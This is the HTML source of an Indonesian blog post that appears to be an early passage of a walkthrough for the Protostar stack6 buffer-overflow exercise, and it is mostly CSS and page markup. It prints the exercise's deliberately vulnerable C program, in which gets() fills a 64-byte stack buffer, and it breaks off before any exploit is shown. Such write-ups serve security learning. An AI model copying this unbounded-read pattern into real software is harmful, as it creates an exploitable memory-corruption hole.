@@ -1,0 +1,986 @@
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style id="typography.js">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block}audio:not([controls]){display:none;height:0}progress{vertical-align:baseline}[hidden],template{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:inherit;font-weight:bolder}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}svg:not(:root){overflow:hidden}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}button,input,optgroup,select,textarea{font:inherit;margin:0}optgroup{font-weight:700}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{font:100%/1.4 'Roboto',sans-serif;box-sizing:border-box;overflow-y:scroll;-webkit-font-smoothing:antialiased;}*{box-sizing:inherit;}*:before{box-sizing:inherit;}*:after{box-sizing:inherit;}body{color:hsla(0,0%,0%,0.87);font-family:'Roboto',sans-serif;font-weight:400;word-wrap:break-word;font-kerning:normal;-moz-font-feature-settings:"kern", "liga", "clig", "calt";-ms-font-feature-settings:"kern", "liga", "clig", "calt";-webkit-font-feature-settings:"kern", "liga", "clig", "calt";font-feature-settings:"kern", "liga", "clig", "calt";letter-spacing:.03em;}img{max-width:100%;margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}h1{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:2rem;line-height:1.1;}h2{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:1.51572rem;line-height:1.1;}h3{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:1.31951rem;line-height:1.1;}h4{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:1rem;line-height:1.1;}h5{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:0.87055rem;line-height:1.1;}h6{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:0.81225rem;line-height:1.1;}hgroup{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}ul{margin-left:1.4rem;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;list-style-position:outside;list-style-image:none;}ol{margin-left:1.4rem;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;list-style-position:outside;list-style-image:none;}dl{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}dd{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}p{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}figure{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}pre{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;font-size:0.85rem;line-height:1.4rem;}table{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;font-size:1rem;line-height:1.4rem;border-collapse:collapse;width:100%;}fieldset{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}blockquote{margin-left:-1.4rem;margin-right:1.4rem;margin-top:0;padding-bottom:0;padding-left:1.1375rem;padding-right:0;padding-top:0;margin-bottom:1.4rem;font-size:1.1487rem;line-height:1.4rem;color:hsla(0,0%,0%,0.6);border-left:0.2625rem solid hsla(0,0%,0%,0.87);}form{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}noscript{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}iframe{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}hr{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:calc(1.4rem - 1px);background:hsla(0,0%,0%,0.2);border:none;height:1px;}address{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}b{font-weight:700;}strong{font-weight:700;}dt{font-weight:700;}th{font-weight:700;}li{margin-bottom:calc(1.4rem / 2);}ol li{padding-left:0;}ul li{padding-left:0;}li > ol{margin-left:1.4rem;margin-bottom:calc(1.4rem / 2);margin-top:calc(1.4rem / 2);}li > ul{margin-left:1.4rem;margin-bottom:calc(1.4rem / 2);margin-top:calc(1.4rem / 2);}blockquote *:last-child{margin-bottom:0;}li *:last-child{margin-bottom:0;}p *:last-child{margin-bottom:0;}li > p{margin-bottom:calc(1.4rem / 2);}code{font-size:0.7rem!important;line-height:1!important;}kbd{font-size:0.85rem;line-height:1.4rem;}samp{font-size:0.85rem;line-height:1.4rem;}abbr{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;}acronym{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;}abbr[title]{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;text-decoration:none;}thead{text-align:left;}td,th{text-align:left;border-bottom:1px solid hsla(0,0%,0%,0.12);font-feature-settings:"tnum";-moz-font-feature-settings:"tnum";-ms-font-feature-settings:"tnum";-webkit-font-feature-settings:"tnum";padding-left:0.93333rem;padding-right:0.93333rem;padding-top:0.7rem;padding-bottom:calc(0.7rem - 1px);}th:first-child,td:first-child{padding-left:0;}th:last-child,td:last-child{padding-right:0;}a{color:inherit;}a:hover{color:#3498DB;}@media only screen and (max-width:480px){blockquote{margin-left:-1.05rem;padding-left:0.7875rem;margin-right:0;}}</style><style data-href="/styles.85333577aa7dbfd7b7d3.css">code[class*=language-],pre[class*=language-]{color:#657b83;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}code[class*=language-]::selection,code[class*=language-] ::selection,pre[class*=language-]::selection,pre[class*=language-] ::selection{background:#073642}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto;border-radius:.3em}:not(pre)>code[class*=language-],pre[class*=language-]{background-color:#fdf6e3}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#93a1a1}.token.punctuation{color:#586e75}.token.namespace{opacity:.7}.token.boolean,.token.constant,.token.deleted,.token.number,.token.property,.token.symbol,.token.tag{color:#268bd2}.token.attr-name,.token.builtin,.token.char,.token.inserted,.token.selector,.token.string,.token.url{color:#2aa198}.token.entity{color:#657b83;background:#eee8d5}.token.atrule,.token.attr-value,.token.keyword{color:#859900}.token.class-name,.token.function{color:#b58900}.token.important,.token.regex,.token.variable{color:#cb4b16}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}</style><meta name="generator" content="Gatsby 2.23.22"/><title data-react-helmet="true">Protostar: stack6 | Rochim&#x27;s Log</title><meta data-react-helmet="true" name="google-site-verification" content="Mss0Hxe25yLcF_RF5r9RCdZJNLRyMN9PVSGzKd5neb0"/><style type="text/css">svg:not(:root).svg-inline--fa {
+  overflow: visible;
+}
+
+.svg-inline--fa {
+  display: inline-block;
+  font-size: inherit;
+  height: 1em;
+  overflow: visible;
+  vertical-align: -0.125em;
+}
+.svg-inline--fa.fa-lg {
+  vertical-align: -0.225em;
+}
+.svg-inline--fa.fa-w-1 {
+  width: 0.0625em;
+}
+.svg-inline--fa.fa-w-2 {
+  width: 0.125em;
+}
+.svg-inline--fa.fa-w-3 {
+  width: 0.1875em;
+}
+.svg-inline--fa.fa-w-4 {
+  width: 0.25em;
+}
+.svg-inline--fa.fa-w-5 {
+  width: 0.3125em;
+}
+.svg-inline--fa.fa-w-6 {
+  width: 0.375em;
+}
+.svg-inline--fa.fa-w-7 {
+  width: 0.4375em;
+}
+.svg-inline--fa.fa-w-8 {
+  width: 0.5em;
+}
+.svg-inline--fa.fa-w-9 {
+  width: 0.5625em;
+}
+.svg-inline--fa.fa-w-10 {
+  width: 0.625em;
+}
+.svg-inline--fa.fa-w-11 {
+  width: 0.6875em;
+}
+.svg-inline--fa.fa-w-12 {
+  width: 0.75em;
+}
+.svg-inline--fa.fa-w-13 {
+  width: 0.8125em;
+}
+.svg-inline--fa.fa-w-14 {
+  width: 0.875em;
+}
+.svg-inline--fa.fa-w-15 {
+  width: 0.9375em;
+}
+.svg-inline--fa.fa-w-16 {
+  width: 1em;
+}
+.svg-inline--fa.fa-w-17 {
+  width: 1.0625em;
+}
+.svg-inline--fa.fa-w-18 {
+  width: 1.125em;
+}
+.svg-inline--fa.fa-w-19 {
+  width: 1.1875em;
+}
+.svg-inline--fa.fa-w-20 {
+  width: 1.25em;
+}
+.svg-inline--fa.fa-pull-left {
+  margin-right: 0.3em;
+  width: auto;
+}
+.svg-inline--fa.fa-pull-right {
+  margin-left: 0.3em;
+  width: auto;
+}
+.svg-inline--fa.fa-border {
+  height: 1.5em;
+}
+.svg-inline--fa.fa-li {
+  width: 2em;
+}
+.svg-inline--fa.fa-fw {
+  width: 1.25em;
+}
+
+.fa-layers svg.svg-inline--fa {
+  bottom: 0;
+  left: 0;
+  margin: auto;
+  position: absolute;
+  right: 0;
+  top: 0;
+}
+
+.fa-layers {
+  display: inline-block;
+  height: 1em;
+  position: relative;
+  text-align: center;
+  vertical-align: -0.125em;
+  width: 1em;
+}
+.fa-layers svg.svg-inline--fa {
+  -webkit-transform-origin: center center;
+          transform-origin: center center;
+}
+
+.fa-layers-counter, .fa-layers-text {
+  display: inline-block;
+  position: absolute;
+  text-align: center;
+}
+
+.fa-layers-text {
+  left: 50%;
+  top: 50%;
+  -webkit-transform: translate(-50%, -50%);
+          transform: translate(-50%, -50%);
+  -webkit-transform-origin: center center;
+          transform-origin: center center;
+}
+
+.fa-layers-counter {
+  background-color: #ff253a;
+  border-radius: 1em;
+  -webkit-box-sizing: border-box;
+          box-sizing: border-box;
+  color: #fff;
+  height: 1.5em;
+  line-height: 1;
+  max-width: 5em;
+  min-width: 1.5em;
+  overflow: hidden;
+  padding: 0.25em;
+  right: 0;
+  text-overflow: ellipsis;
+  top: 0;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: top right;
+          transform-origin: top right;
+}
+
+.fa-layers-bottom-right {
+  bottom: 0;
+  right: 0;
+  top: auto;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: bottom right;
+          transform-origin: bottom right;
+}
+
+.fa-layers-bottom-left {
+  bottom: 0;
+  left: 0;
+  right: auto;
+  top: auto;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: bottom left;
+          transform-origin: bottom left;
+}
+
+.fa-layers-top-right {
+  right: 0;
+  top: 0;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: top right;
+          transform-origin: top right;
+}
+
+.fa-layers-top-left {
+  left: 0;
+  right: auto;
+  top: 0;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: top left;
+          transform-origin: top left;
+}
+
+.fa-lg {
+  font-size: 1.3333333333em;
+  line-height: 0.75em;
+  vertical-align: -0.0667em;
+}
+
+.fa-xs {
+  font-size: 0.75em;
+}
+
+.fa-sm {
+  font-size: 0.875em;
+}
+
+.fa-1x {
+  font-size: 1em;
+}
+
+.fa-2x {
+  font-size: 2em;
+}
+
+.fa-3x {
+  font-size: 3em;
+}
+
+.fa-4x {
+  font-size: 4em;
+}
+
+.fa-5x {
+  font-size: 5em;
+}
+
+.fa-6x {
+  font-size: 6em;
+}
+
+.fa-7x {
+  font-size: 7em;
+}
+
+.fa-8x {
+  font-size: 8em;
+}
+
+.fa-9x {
+  font-size: 9em;
+}
+
+.fa-10x {
+  font-size: 10em;
+}
+
+.fa-fw {
+  text-align: center;
+  width: 1.25em;
+}
+
+.fa-ul {
+  list-style-type: none;
+  margin-left: 2.5em;
+  padding-left: 0;
+}
+.fa-ul > li {
+  position: relative;
+}
+
+.fa-li {
+  left: -2em;
+  position: absolute;
+  text-align: center;
+  width: 2em;
+  line-height: inherit;
+}
+
+.fa-border {
+  border: solid 0.08em #eee;
+  border-radius: 0.1em;
+  padding: 0.2em 0.25em 0.15em;
+}
+
+.fa-pull-left {
+  float: left;
+}
+
+.fa-pull-right {
+  float: right;
+}
+
+.fa.fa-pull-left,
+.fas.fa-pull-left,
+.far.fa-pull-left,
+.fal.fa-pull-left,
+.fab.fa-pull-left {
+  margin-right: 0.3em;
+}
+.fa.fa-pull-right,
+.fas.fa-pull-right,
+.far.fa-pull-right,
+.fal.fa-pull-right,
+.fab.fa-pull-right {
+  margin-left: 0.3em;
+}
+
+.fa-spin {
+  -webkit-animation: fa-spin 2s infinite linear;
+          animation: fa-spin 2s infinite linear;
+}
+
+.fa-pulse {
+  -webkit-animation: fa-spin 1s infinite steps(8);
+          animation: fa-spin 1s infinite steps(8);
+}
+
+@-webkit-keyframes fa-spin {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg);
+  }
+}
+
+@keyframes fa-spin {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg);
+  }
+}
+.fa-rotate-90 {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
+  -webkit-transform: rotate(90deg);
+          transform: rotate(90deg);
+}
+
+.fa-rotate-180 {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
+  -webkit-transform: rotate(180deg);
+          transform: rotate(180deg);
+}
+
+.fa-rotate-270 {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
+  -webkit-transform: rotate(270deg);
+          transform: rotate(270deg);
+}
+
+.fa-flip-horizontal {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
+  -webkit-transform: scale(-1, 1);
+          transform: scale(-1, 1);
+}
+
+.fa-flip-vertical {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
+  -webkit-transform: scale(1, -1);
+          transform: scale(1, -1);
+}
+
+.fa-flip-both, .fa-flip-horizontal.fa-flip-vertical {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
+  -webkit-transform: scale(-1, -1);
+          transform: scale(-1, -1);
+}
+
+:root .fa-rotate-90,
+:root .fa-rotate-180,
+:root .fa-rotate-270,
+:root .fa-flip-horizontal,
+:root .fa-flip-vertical,
+:root .fa-flip-both {
+  -webkit-filter: none;
+          filter: none;
+}
+
+.fa-stack {
+  display: inline-block;
+  height: 2em;
+  position: relative;
+  width: 2.5em;
+}
+
+.fa-stack-1x,
+.fa-stack-2x {
+  bottom: 0;
+  left: 0;
+  margin: auto;
+  position: absolute;
+  right: 0;
+  top: 0;
+}
+
+.svg-inline--fa.fa-stack-1x {
+  height: 1em;
+  width: 1.25em;
+}
+.svg-inline--fa.fa-stack-2x {
+  height: 2em;
+  width: 2.5em;
+}
+
+.fa-inverse {
+  color: #fff;
+}
+
+.sr-only {
+  border: 0;
+  clip: rect(0, 0, 0, 0);
+  height: 1px;
+  margin: -1px;
+  overflow: hidden;
+  padding: 0;
+  position: absolute;
+  width: 1px;
+}
+
+.sr-only-focusable:active, .sr-only-focusable:focus {
+  clip: auto;
+  height: auto;
+  margin: 0;
+  overflow: visible;
+  position: static;
+  width: auto;
+}
+
+.svg-inline--fa .fa-primary {
+  fill: var(--fa-primary-color, currentColor);
+  opacity: 1;
+  opacity: var(--fa-primary-opacity, 1);
+}
+
+.svg-inline--fa .fa-secondary {
+  fill: var(--fa-secondary-color, currentColor);
+  opacity: 0.4;
+  opacity: var(--fa-secondary-opacity, 0.4);
+}
+
+.svg-inline--fa.fa-swap-opacity .fa-primary {
+  opacity: 0.4;
+  opacity: var(--fa-secondary-opacity, 0.4);
+}
+
+.svg-inline--fa.fa-swap-opacity .fa-secondary {
+  opacity: 1;
+  opacity: var(--fa-primary-opacity, 1);
+}
+
+.svg-inline--fa mask .fa-primary,
+.svg-inline--fa mask .fa-secondary {
+  fill: black;
+}
+
+.fad.fa-inverse {
+  color: #fff;
+}</style><link href="//fonts.googleapis.com/css?family=Roboto:400,400i|Lato:400,700" rel="stylesheet" type="text/css"/><link as="script" rel="preload" href="/webpack-runtime-64b4c2d3318702dd0a66.js"/><link as="script" rel="preload" href="/framework-8dcecaaefd71e2213eb2.js"/><link as="script" rel="preload" href="/styles-fa79fef4936efa84b233.js"/><link as="script" rel="preload" href="/app-fc0792eb657b24edfecf.js"/><link as="script" rel="preload" href="/a9a7754c-a89164b92346a482070c.js"/><link as="script" rel="preload" href="/commons-0d874dae4b82f1c3f7da.js"/><link as="script" rel="preload" href="/component---src-templates-blog-post-js-0314926304c56436cd57.js"/><link as="fetch" rel="preload" href="/page-data/belajar-reversing-protostar-stack6/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><style data-emotion-css="my6y82">.css-my6y82{margin:0 auto;max-width:800px;padding:2.1rem;padding-top:2.1rem;}</style><div class="css-my6y82"><nav style="display:flex;justify-content:space-between"><a href="/"><h2 style="display:inline-block">Rochim&#x27;s Log</h2></a><div><a style="text-decoration:none;float:right;margin-right:10px" href="/about/">About</a><a style="text-decoration:none;float:right;margin-right:10px" href="/contact/">Contact</a><a style="text-decoration:none;float:right;margin-right:10px" href="/blog/">Blog</a></div></nav><hr/><div><h1>Protostar: stack6</h1><div><p>Melanjutkan ke stack6. Mari kita mulai dengan memeriksa stack6 dengan utilitas <code class="language-text">file</code>.</p>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 658px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/4fd167db9d60cc6838d7478246b28fcb/889a4/protostar-stack6-1.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 10.999999999999998%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsSAAALEgHS3X78AAAAaUlEQVQI1w2MWw7CMAwEe6ZCIQlJbSeNXyCVcv/D4J/RrjS7y/v6IctQJ5YIXTRIqihCzN2s9iMDPWpLO27BBvdSo5J9Fv9eOHmYw2QS6WrECnP6ecZLqBnwhZR3LEhtHDG7pbI+E4r/AYCfHuSyGO5mAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="output file stack6"
+        title="output file stack6"
+        src="/static/4fd167db9d60cc6838d7478246b28fcb/889a4/protostar-stack6-1.png"
+        srcset="/static/4fd167db9d60cc6838d7478246b28fcb/772e8/protostar-stack6-1.png 200w,
+/static/4fd167db9d60cc6838d7478246b28fcb/e17e5/protostar-stack6-1.png 400w,
+/static/4fd167db9d60cc6838d7478246b28fcb/889a4/protostar-stack6-1.png 658w"
+        sizes="(max-width: 658px) 100vw, 658px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Karena tidak ada perbedaan dengan sebelmunya mari kita lanjut melihat source codenya.</p>
+<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token keyword">void</span> <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input path please: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  ret <span class="token operator">=</span> <span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bzzzt (%p)\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"got path %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre></div>
+<p>Jika dibandingkan dengan <a href="/belajar-reversing-protostar-stack5">stack5</a> kali ini fungsi gets dimasukkan pada fungsi tersendiri dengan nama getpath. Didalam fungsi getpath terdapat pemanggilan fungsi yang tampak asing yaitu <strong>fflush</strong> dan <strong>__builtin<em>return</em>address</strong>. Jika kita lihat manual dari kedua fungsi tersebut.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">man</span> flush</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 654px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/049fa03b4280c2e3c1099c7ce6275372/68e9c/protostar-stack6-2.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsSAAALEgHS3X78AAACJ0lEQVQ4y4VT2Y7TQBD0p7Cncvoc3+MzTpwsJF+CWC2shEArEF9eTLXjJAogHko9TndXVx+xbu0AxJ2jcGcr3DshbpcBpiqDqjqBnZZw8xqebuAXLSZBgndzDzdLHzcLYxc+JirFLMxgOYmGl5Ww4xzzMBU7UwnctJA3/VM/wsQLT/be9vHgBHgw9tHYuYmfBTGmppBVrDpEeYFloLDwz7BVBJVpgxxZ3YiNixJhrk1sKH7bWCeMEOkCQZpBd70hbDtxRrqEn6RHZ46krODF6bmISb4sRtLlaA1mjoe8XcMquzWafisKSMBKJHajxFSPByVXGElOSg3mXjAQkoDq2HpWNdDtSlq8TvgfBsINrJnri5KkrKGbFlTMWZGYbbPFS0X/AnlEYbvdoXt6j2q9kXbPbWenubJ91xRlYXkfwViCMVxOvjIKKTc2Skh4je3hIIpXuyf57vd7+R79nH3ZdSKo7XtU/Q4WW+JWGcg5VsZyhnyzbaLe9JK83R+Qm7FInCHUzeoUw9/L9RYW+6dkzisuKrk9nk5a1TJLzpa3xzd/45uxo38cA4VJyyTkHKiKRLRhpoWc30wIzeEziT6S8T0KICnBWDlsrpsBrMggKuBNkoRvLocjYXJaDjFcFgv9eYdGoToSsFU6vJgbHNoYt+0bG+uh/YGw+Avh8Wzefv0A8f3nG55fP+PjyzM+fXnB67ev2HzYY2K7kjj3lKggxtsc/zWXhL8BOmj0dgN6+KcAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="man flush"
+        title="man flush"
+        src="/static/049fa03b4280c2e3c1099c7ce6275372/68e9c/protostar-stack6-2.png"
+        srcset="/static/049fa03b4280c2e3c1099c7ce6275372/772e8/protostar-stack6-2.png 200w,
+/static/049fa03b4280c2e3c1099c7ce6275372/e17e5/protostar-stack6-2.png 400w,
+/static/049fa03b4280c2e3c1099c7ce6275372/68e9c/protostar-stack6-2.png 654w"
+        sizes="(max-width: 654px) 100vw, 654px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Fungsi flush ini sepertinya dapat kita abaikan. Sekarang kita lihat untuk fungsi __builtin<em>return</em>address. Disini saya mencari manualnya dari google karena tidak dapat menemukannya secara local.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 683px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/33ac280a08b6a543e87e21abba0bcf47/bca35/protostar-stack6-3.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
